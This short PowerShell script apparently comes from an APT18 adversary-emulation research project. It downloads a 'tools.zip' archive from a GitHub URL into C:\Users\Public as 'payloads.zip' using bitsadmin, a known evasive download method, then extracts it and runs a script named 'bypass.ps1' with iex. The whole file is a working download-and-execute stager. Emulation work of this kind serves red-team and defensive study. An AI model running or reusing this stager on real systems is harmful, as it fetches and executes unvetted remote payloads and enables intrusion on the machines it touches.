# Define the URL of the ZIP file and the local path to save it
$url = "https://github.com/alekzandr/Research/raw/main/APT18/Scenario%202/tools.zip"
$zipPath = "C:\Users\Public\payloads.zip"

# Download the ZIP file
# Invoke-WebRequest -Uri $url -OutFile $zipPath

# Define the URL of the ZIP file and the local path to save it
$url = "https://github.com/alekzandr/Research/raw/main/APT18/Scenario%202/tools.zip"
$zipPath = "C:\Users\Public\payloads.zip"

# Download the ZIP file
# Invoke-WebRequest -Uri $url -OutFile $zipPath

# Download the ZIP file using bitsadmin
$bitsJobName = "DownloadZip"
bitsadmin /create $bitsJobName
bitsadmin /addfile $bitsJobName $url $zipPath
bitsadmin /resume $bitsJobName
# Wait for the download to complete
do {
    Start-Sleep -Seconds 2
    $jobState = bitsadmin /info $bitsJobName /verbose | Select-String "STATE:" -Context 0,1
} while ($jobState -notmatch "TRANSFERRED")
# Complete the BITS job
bitsadmin /complete $bitsJobName

# Define the extraction path
$extractPath = "C:\Users\Public\payloads"

# Extract the ZIP file
Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath

# Define the path of the PowerShell script inside the extracted folder
# Update the script name as per your ZIP content
$scriptPath = Join-Path $extractPath "bypass.ps1"

# Execute the PowerShell script
iex $scriptPath